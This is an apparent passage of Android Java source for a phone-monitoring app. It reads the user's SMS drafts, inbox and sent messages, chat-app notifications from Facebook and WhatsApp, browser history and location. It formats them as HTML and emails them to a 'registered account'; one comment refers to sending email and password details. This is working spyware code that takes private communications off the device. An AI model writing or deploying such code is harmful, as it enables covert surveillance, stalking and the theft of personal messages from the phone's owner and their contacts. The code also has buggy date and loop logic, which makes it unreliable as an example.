	}

	 @Override
	protected void onPostExecute(Void result) 
	 {
		super.onPostExecute(result);
		
		//===get all locations data from database and convert it into html format and save in a string to further send it to mail account.
		  GetLocationDataAndConvertItIntoHtmlFormat();
		
		  GetNotificationMessagesAndConvertItIntoHtmlFormat();
		  
		  getBrowserHist();
		
		  getMessageInfoAndUpdateDatabase();
		
		  sendEmailToRegisteredAccount();
	       
		/*//---close snooze actiivty 
		SnoozeActivity obj = new SnoozeActivity();
		obj.finishMethod();
		
		*/	//dialog.dismiss();

	        }

	    

		@Override
	        protected void onProgressUpdate(Void... values) 
	       
	       {
		    super.onProgressUpdate(values);
             
		
	}


	}



//---Method to get Notification msg list
private void GetNotificationMessagesAndConvertItIntoHtmlFormat() 
{
	
	DBController dbController = new DBController(this);
	
	UserData.clear();
	
	UserData = dbController.getUserNotiMsgData();
	
    //	Log.e("user location array size-----------", String.valueOf(UserData.size()));
	
	//----adding header to the location data details...
	NotificationInformation = String.valueOf(Html.fromHtml(new StringBuilder() 
	
	        .append("<br><p><b><marquee><font color='#145A14'>User Facebook , Whats App and other chatting application Data Detail are as given below:-----------------------------</font></marquee></b></p><br>")
	
	.toString()));

	//---converterting order list data into html format...
	for(int i=0;i< UserData.size();i++)
	
	{
	
		NotificationInformation  =	NotificationInformation + String.valueOf(Html.fromHtml(new StringBuilder()
           
		    .append("<br><br><p><b><font color='#145A14'> Sr. No -:</font></b><b>"+UserData.get(i).get("Id")+"</b></p>")
            
            .append("<p><b><font color='#145A14'>Message   -:</font></b><b>"+UserData.get(i).get("NotificationMsg")+"</b></p>")
            
            .append("<p><b><font color='#145A14'> From   -:</font></b><b>"+UserData.get(i).get("MsgFrom")+"</b></p>")
                
            .append("<p><b><font color='#145A14'> Time   -:</font></b><b>"+UserData.get(i).get("NotificationTime")+"</b></p>")
            
            .toString()));

	}
	
//Log.i("LocationInformation",LocationInformation);
}
//===================================CODE TO RETRIEVE SMS DATA IS STARTING FROM HERE=================================================

private void getMessageInfoAndUpdateDatabase() 

{
	GetDraft();
	GetInbox();
	GetSentBox();
	
}



private void GetDraft() 
{
	
	Log.i("inside draft","inside draft");
	
	 // Create Draft box URI
    Uri draftURI = Uri.parse("content://sms/draft");

    // Get Content Resolver object, which will deal with Content Provider
    ContentResolver cr = getContentResolver();

    // Fetch Sent SMS Message from Built-in Content Provider
    Cursor c = cr.query(draftURI, null, null, null, null);
    
 // Read the sms data and store it in the list
    if(c.moveToFirst()) {
        for(int i=0; i < c.getCount(); i++) {
            SMSData sms = new SMSData();
            
         //---formating type of message from int to string with name  
         int   smsType = c.getColumnIndexOrThrow("type");
         Log.i("smsType", String.valueOf(smsType));
         String smsTypeString="Sent Msg";
            if(smsType==0)
            {
            	smsTypeString = "(All Messages)";
            }
            else if(smsType==3)
            {
            	smsTypeString = "(Draft Messages)";
            }
            else if(smsType==1)
            {
            	smsTypeString = "(Inbox Messages)";
            }
            
            else if(smsType==2)
            {
            	smsTypeString = "(Sent Messages)";
            }
            else 
            {
            	smsTypeString = "(To Be Sent Later Messages)";
            }
            
            sms.setType (smsTypeString);
            
            int date = c.getColumnIndexOrThrow("date");
			
            //---converting date into proper format
			    
			    long seconds=c.getLong(date);
			    
			    SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
			    
			    String dateString = formatter.format(new Date(seconds));
			
			    
			    SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy");
				
				 
				   //get current date time with Calendar()
				   Calendar cal = Calendar.getInstance();
				   String  sysDate = sdf.format(cal.getTime());
				   System.out.println("system date format---"+sysDate);
			    
			    
				   
			  
				   
						  
						  try {
						  
			        	Date date1 = sdf.parse(sysDate);
					
			        	Date date2 = sdf.parse(dateString);
			 
			        	System.out.println(sdf.format(date1));
			        	System.out.println(sdf.format(date2));
			 
			        	Calendar cal1 = Calendar.getInstance();
			        	Calendar cal2 = Calendar.getInstance();
			        	
			        	cal1.setTime(date1);
			        	cal2.setTime(date2);
			 
			        	if(cal1.after(cal2)) {
			        		
			        		//---Toast.makeText(context, "Please select present or future date.", Toast.LENGTH_SHORT).show();
			        		
			        		System.out.println("system date is after current date");
			        		
			        		
			        		break;
			        		
			        	}
			 
			        	if(cal1.before(cal2)){
			  
			        		System.out.println("system date is before current date");
			        		
			        	
			        		break;
			
			        	}
			 
			        	if(cal1.equals(cal2)){
			        		
			        	
			        		System.out.println("system date is equal current date");
			    
			        		//break;
			        		
			        	}
							} catch (java.text.ParseException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
			    
			    sms.setDate     (dateString);
            
			    
            // sms.setPerson   (c.getString      (c.getColumnIndexOrThrow("person")).toString());
            // sms.setProtocol (c.getString  (c.getColumnIndexOrThrow("protocol")).toString());
			     sms.set_id      (c.getString      (c.getColumnIndexOrThrow("_id")).toString());   
                 sms.setBody     (c.getString      (c.getColumnIndexOrThrow("body")).toString());
            // sms.setNumber   (c.getString    (c.getColumnIndexOrThrow("address")).toString());
             smsDraftList.add(sms);

            c.moveToNext();
        }
    }
    c.close();

	for(int i=0;i < smsDraftList.size();i++)
	{
		Log.i("sms list data==","--date--"+ smsDraftList.get(i).getDate()+"---body---"+ smsDraftList.get(i).getBody()+"--address--"+ smsDraftList.get(i).getAddress()+"--type--"+ smsDraftList.get(i).getType());
	}
	

	
	
	//----adding header to the location data details...
	smsDraftboxString = String.valueOf(Html.fromHtml(new StringBuilder() 
			
			    .append("<br><p><b><marquee><font color='#145A14'>User Sms Draftbox Details are as given below:-------------------------------------------------------</font></marquee></b></p><br>")
			
			.toString()));
			
			//---converterting order list data into html format...
			
			for(int i=0;i< smsDraftList.size();i++)
			{
				
				
									
				smsDraftboxString =	smsDraftboxString + String.valueOf(Html.fromHtml(new StringBuilder()
				
		            .append("<br><br><p><b><font color='#145A14'> Sr. No -:</font></b><b>"+smsDraftList.get(i).get_id()+"</b></p>")
		            
		             //.append("<p><b><font color='#145A14'>CallerId   -:</font></b><b>"+UserData.get(i).get("CallerId")+"</b></p>")
		            
		             .append("<p><b><font color='#145A14'>Date   -:</font></b><b>"+smsDraftList.get(i).getDate()+"sec"+"</b></p>")
		             
		              .append("<p><b><font color='#145A14'>Message body   -:</font></b><b>"+smsDraftList.get(i).getBody()+"</b></p>")
		              
		               .append("<p><b><font color='#145A14'>Message type   -:</font></b><b>"+smsDraftList.get(i).getType()+"</b></p>")
		               
		               
	               
	                .toString()));
				
				//===Log.i("smsDraftboxString",smsDraftboxString);

			}
			
			Log.i("smsDraftboxString",smsDraftboxString);
	
}



private void GetInbox() 
{
	
	
	Log.i("inside Inbox","inside Inbox");
    // Create Inbox box URI
    Uri inboxURI = Uri.parse("content://sms/inbox");
    // Get Content Resolver object, which will deal with Content Provider
    ContentResolver cr = getContentResolver();

    // Fetch Sent SMS Message from Built-in Content Provider
    Cursor c = cr.query(inboxURI, null, null, null, null);
    
 // Read the sms data and store it in the list
    
    if(c.moveToFirst()) 
    {
        for(int i=0; i < c.getCount(); i++) 
        
        {
            SMSData sms = new SMSData();
            
         //---formating type of message from int to string with name  
         int   smsType = c.getColumnIndexOrThrow("type");
         Log.i("smsType", String.valueOf(smsType));
         String smsTypeString="Sent Msg";
            if(smsType==0)
            {
            	smsTypeString = "(All Messages)";
            }
            else if(smsType==3)
            {
            	smsTypeString = "(Draft Messages)";
            }
            else if(smsType==1)
            {
            	smsTypeString = "(Inbox Messages)";
            }
            
            else if(smsType==2)
            {
            	smsTypeString = "(Sent Messages)";
            }
            else 
            {
            	smsTypeString = "(To Be Sent Later Messages)";
            }
            
            sms.setType (smsTypeString);
            
            int date = c.getColumnIndexOrThrow("date");
			//---converting date into proper format
			    
			    long seconds=c.getLong(date);
			    
			    SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
			    
			    String dateString = formatter.format(new Date(seconds));
			
			    SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy");
				
				 
				   //get current date time with Calendar()
				   Calendar cal = Calendar.getInstance();
				   String  sysDate = sdf.format(cal.getTime());
				   System.out.println("system date format---"+sysDate);
			    
			    
				   
			  
				   
						  
						  try {
						  
			        	Date date1 = sdf.parse(sysDate);
					
			        	Date date2 = sdf.parse(dateString);
			 
			        	System.out.println(sdf.format(date1));
			        	System.out.println(sdf.format(date2));
			 
			        	Calendar cal1 = Calendar.getInstance();
			        	Calendar cal2 = Calendar.getInstance();
			        	
			        	cal1.setTime(date1);
			        	cal2.setTime(date2);
			 
			        	if(cal1.after(cal2)) {
			        		
			        		//---Toast.makeText(context, "Please select present or future date.", Toast.LENGTH_SHORT).show();
			        		
			        		System.out.println("system date is after current date");
			        		
			        		
			        		break;
			        		
			        	}
			 
			        	if(cal1.before(cal2)){
			  
			        		System.out.println("system date is before current date");
			        		
			        	
			        		break;
			
			        	}
			 
			        	if(cal1.equals(cal2)){
			        		
			        	
			        		System.out.println("system date is equal current date");
			    
			        		//break;
			        		
			        	}
							} catch (java.text.ParseException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
			    
			    
			    sms.setDate     (dateString);
            
			    
            // sms.setPerson   (c.getString      (c.getColumnIndexOrThrow("person")).toString());
            // sms.setProtocol (c.getString  (c.getColumnIndexOrThrow("protocol")).toString());
		    sms.set_id      (c.getString      (c.getColumnIndexOrThrow("_id")).toString());    
            sms.setBody     (c.getString      (c.getColumnIndexOrThrow("body")).toString());
            sms.setNumber   (c.getString      (c.getColumnIndexOrThrow("address")).toString());
            smsInboxList.add(sms);

            c.moveToNext();
        }
    }
    c.close();

	for(int i=0;i < smsInboxList.size();i++)
	{
		Log.i("sms list data==","--date--"+ smsInboxList.get(i).getDate()+"--body--"+ smsInboxList.get(i).getBody()+"--address--"+ smsInboxList.get(i).getAddress()+"--type--"+ smsInboxList.get(i).getType());
	}
	
	
	
	
	
	
	
	
	//----adding header to the location data details...
	        smsInboxString = String.valueOf(Html.fromHtml(new StringBuilder() 
			
			    .append("<br><p><b><marquee><font color='#145A14'>User Sms Inbox Details are as given below:----------------------------------------------------------</font></marquee></b></p><br>")
			
			.toString()));
			
			//---converterting order list data into html format...
			
			for(int i=0;i< smsInboxList.size();i++)
			{
				
				
				Log.i("sms list data==","--date--"+ smsInboxList.get(i).getDate()+"--body--"+ smsInboxList.get(i).getBody()+"--address--"+ smsInboxList.get(i).getAddress()+"--type--"+ smsInboxList.get(i).getType());
									
				smsInboxString =	smsInboxString + String.valueOf(Html.fromHtml(new StringBuilder()
				
		            .append("<br><br><p><b><font color='#145A14'> Sr. No -:</font></b><b>"+smsInboxList.get(i).get_id()+"</b></p>")
		            
		            //.append("<p><b><font color='#145A14'>CallerId   -:</font></b><b>"+UserData.get(i).get("CallerId")+"</b></p>")
		            
		             .append("<p><b><font color='#145A14'>Date   -:</font></b><b>"+smsInboxList.get(i).getDate()+"sec"+"</b></p>")
		             
		              .append("<p><b><font color='#145A14'>Message body   -:</font></b><b>"+smsInboxList.get(i).getBody()+"</b></p>")
		              
		               .append("<p><b><font color='#145A14'>Message type   -:</font></b><b>"+smsInboxList.get(i).getType()+"</b></p>")
		               
		               
	               
	                .toString()));
				
				//Log.i("smsInboxString",smsInboxString);

			}
			
			Log.i("smsInboxString",smsInboxString);
	
}

private void GetSentBox() 
{   
	
	Log.i("inside sentbox","inside sentbox");	
	
	/**
    
0: _id
1: thread_id
2: address
3: person
4: date
5: protocol
6: read   
7: status
8: type
9: reply_path_present
10: subject
11: body
12: service_center
13: locked
  
    * */
	 // Create Sent box URI
    Uri sentURI = Uri.parse("content://sms/sent");

    // Get Content Resolver object, which will deal with Content Provider
    ContentResolver cr = getContentResolver();

    // Fetch Sent SMS Message from Built-in Content Provider
    Cursor c = cr.query(sentURI, null, null, null, null);
    
 // Read the sms data and store it in the list
    if(c.moveToFirst()) {
        for(int i=0; i < c.getCount(); i++) {
            SMSData sms = new SMSData();
            
         //---formating type of message from int to string with name  
         int   smsType = c.getColumnIndexOrThrow("type");
         Log.i("smsType", String.valueOf(smsType));
         String smsTypeString="Sent Msg";
            
         if(smsType==0)
            {
            	smsTypeString = "(All Messages)";
            }
            
         else if(smsType==3)
            {
            	smsTypeString = "(Draft Messages)";
            }
            
         else if(smsType==1)
            {
            	smsTypeString = "(Inbox Messages)";
            }
            
            
         else if(smsType==2)
            {
            	smsTypeString = "(Sent Messages)";
            }
            
         else 
            {
            	smsTypeString = "(To Be Sent Later Messages)";
            }
            
            sms.setType (smsTypeString);
            
            int date = c.getColumnIndexOrThrow("date");
			//---converting date into proper format
			    
			    long seconds=c.getLong(date);
			    
			    SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
			    
			    String dateString = formatter.format(new Date(seconds));
			    
			    
			    
			    
			    SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy");
				
			 
				   //get current date time with Calendar()
				   Calendar cal = Calendar.getInstance();
				   String  sysDate = sdf.format(cal.getTime());
				//   System.out.println("system date format---"+sysDate);
			    
			    
				   
			  
				   
						  
						  try {
						  
			        	Date date1 = sdf.parse(sysDate);
					
			        	Date date2 = sdf.parse(dateString);
			 
			        	System.out.println(sdf.format(date1));
			        	System.out.println(sdf.format(date2));
			 
			        	Calendar cal1 = Calendar.getInstance();
			        	Calendar cal2 = Calendar.getInstance();
			        	
			        	cal1.setTime(date1);
			        	cal2.setTime(date2);
			 
			        	if(cal1.after(cal2)) {
			        		
			        		//---Toast.makeText(context, "Please select present or future date.", Toast.LENGTH_SHORT).show();
			        		
			      //  		System.out.println("system date is after current date");
			        		
			        		
			        		break;
			        		
			        	}
			 
			        	if(cal1.before(cal2)){
			  
			        //		System.out.println("system date is before current date");
			        		
			        	
			        		break;
			
			        	}
			 
			        	if(cal1.equals(cal2)){
			        		
			        	
			        	//	System.out.println("system date is equal current date");
			    
			        		//break;
			        		
			        	}
							} catch (java.text.ParseException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
			    	
			
			    sms.setDate     (dateString);
            
			    
            // sms.setPerson   (c.getString      (c.getColumnIndexOrThrow("person")).toString());
            // sms.setProtocol (c.getString  (c.getColumnIndexOrThrow("protocol")).toString());
			    
            sms.setBody     (c.getString      (c.getColumnIndexOrThrow("body")).toString());
            sms.set_id      (c.getString      (c.getColumnIndexOrThrow("_id")).toString());
            sms.setNumber   (c.getString    (c.getColumnIndexOrThrow("address")).toString());
            smsSenboxList.add(sms);

            c.moveToNext();
        }
    }
    c.close();

	for(int i=0;i < smsSenboxList.size();i++)
	{
		Log.i("sms list data==","--date--"+ smsSenboxList.get(i).getDate()+"--body--"+ smsSenboxList.get(i).getBody()+"--address--"+ smsSenboxList.get(i).getAddress()+"--type--"+ smsSenboxList.get(i).getType());
	}
	

	//----adding header to the location data details...
	smsSentboxString = String.valueOf(Html.fromHtml(new StringBuilder() 
			
			    .append("<br><p><b><marquee><font color='#145A14'>User Sms Sentbox Details are as given below:--------------------------------------------------------</font></marquee></b></p><br>")
			
			.toString()));
			
			//---converterting order list data into html format...
			
			for(int i=0;i< smsSenboxList.size();i++)
				
				
				
			{
				
				
									
				smsSentboxString =	smsSentboxString + String.valueOf(Html.fromHtml(new StringBuilder()
				
		            .append("<br><br><p><b><font color='#145A14'> Sr. No -:</font></b><b>"+smsSenboxList.get(i).get_id()+"</b></p>")
		            
		            //.append("<p><b><font color='#145A14'>CallerId   -:</font></b><b>"+UserData.get(i).get("CallerId")+"</b></p>")
		            
		             .append("<p><b><font color='#145A14'>Date   -:</font></b><b>"+smsSenboxList.get(i).getDate()+"sec"+"</b></p>")
		             
		              .append("<p><b><font color='#145A14'>Message body   -:</font></b><b>"+smsSenboxList.get(i).getBody()+"</b></p>")
		              
		               .append("<p><b><font color='#145A14'>Message type   -:</font></b><b>"+smsSenboxList.get(i).getType()+"</b></p>")
		               
		               
	               
	                .toString()));
				
				Log.i("smsSentboxString",smsSentboxString);

			}
			
			Log.i("smsSentboxString",smsSentboxString);
	
}

	
	






public void callApi()
{
	
	
	Log.i("inside call Api", "inside call Api");
	   
	//===calling background thread to load messages data
	String url="";
	//DashBoardActivity cont = new DashBoardActivity();
	
	new GetMessageData(context, url).execute();
	
    /*
	     * mail sending method called here
     * sending mail to user account to check wheather this code works or not
     * sending email id and password details to previously registered account.
     */
    
	//sendEmailToRegisteredAccount();
    
    Log.i("email check 1", "Email  sent successfully");
    
    
}



//---get browser history

public  void getBrowserHist()   

{
	browserLog.clear();
	Cursor mCur = managedQuery(Browser.BOOKMARKS_URI,Browser.HISTORY_PROJECTION, null, null, null);
   
    mCur.moveToFirst();
  
    if (mCur.moveToFirst() && mCur.getCount() > 0) 
    {
        while (mCur.isAfterLast() == false)
        {
        	 BrowserData  data = new BrowserData();
            Log.v("titleIdx", mCur
                    .getString(Browser.HISTORY_PROJECTION_TITLE_INDEX));
            
            Log.v("urlIdx", mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX));
            
            
             data.setTitleIdx(mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX));
            
             data.setUrlIdx(mCur.getString  (Browser.HISTORY_PROJECTION_URL_INDEX));
            
             //----check date value is null or not
             String date = mCur.getString  (Browser.HISTORY_PROJECTION_DATE_INDEX);
             //Log.i("date value", date);

             if(  null!=date)
             {
             DateFormat formatter = new SimpleDateFormat("dd/MM/yyyy");

				long milliSeconds= Long.parseLong(mCur.getString  (Browser.HISTORY_PROJECTION_DATE_INDEX));
				Calendar calendar = Calendar.getInstance();
				calendar.setTimeInMillis(milliSeconds);
				System.out.println(formatter.format(calendar.getTime()));
		        String formatedDate = formatter.format(calendar.getTime());
		
		
		        data.setDate(formatedDate);
               
             }
             else
             {
            	 data.setDate("unknown");
             }
             
             data.setVisits(mCur.getString  (Browser.HISTORY_PROJECTION_VISITS_INDEX));
            
            browserLog.add(data);
            
            
            mCur.moveToNext();
            
       }
        
  }
    
    
    
    for(int i=0;i < callLogList.size();i++)
	{
		//Log.i("sms list data==","--date--"+ callLogList.get(i).getDate()+"--body--"+ smsSenboxList.get(i).getBody()+"--address--"+ smsSenboxList.get(i).getAddress()+"--type--"+ smsSenboxList.get(i).getType());
	}
	

	//----Adding header to the location data details...
    browserLogString = String.valueOf(Html.fromHtml(new StringBuilder() 
			
			.append("<br><p><b><marquee><font color='#145A14'>User Browser History details are given below:-----------------------------------------------------------</font></marquee></b></p><br>")
			
			.toString()));
			
			//---converterting order list data into html format...
			
			for(int i=0;i< 11;i++)
			
			{
				
													
				browserLogString =	browserLogString + String.valueOf(Html.fromHtml(new StringBuilder()
				
		           .append("<br><br><p><b><font color='#145A14'> Sr. No -:</font></b><b>"+i+"</b></p>")
		            
		            .append("<p><b><font color='#145A14'> WebSite title   -:</font></b><b>"+browserLog.get(i).getTitleIdx()+"</b></p>")
		            
		             .append("<p><b><font color='#145A14'> Website url   -:</font></b><b>"+browserLog.get(i).getUrlIdx()+"</b></p>")
		             
		               .append("<p><b><font color='#145A14'>Total no of user visits to site  -:</font></b><b>"+browserLog.get(i).getVisits()+"</b></p>")
		            
		                .append("<p><b><font color='#145A14'> Url opened on date   -:</font></b><b>"+browserLog.get(i).getDate()+"</b></p>")
		               
	               
	                .toString()));
				
				

			}
			
		Log.i("browserLogString",browserLogString);
    
}


}